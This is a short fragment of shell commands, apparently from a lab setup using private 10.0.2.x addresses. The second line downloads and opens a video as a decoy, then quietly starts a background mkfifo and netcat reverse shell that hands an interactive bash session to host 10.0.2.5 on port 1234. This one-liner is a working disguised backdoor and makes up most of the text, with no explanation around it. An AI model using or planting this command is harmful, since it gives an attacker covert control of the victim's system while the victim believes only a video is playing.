/usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video' # Download the video



/usr/bin/wget 'http://10.0.2.5/video.mp4' -O /tmp/video.mp4; /usr/bin/xdg-open /tmp/video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 10.0.2.5 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &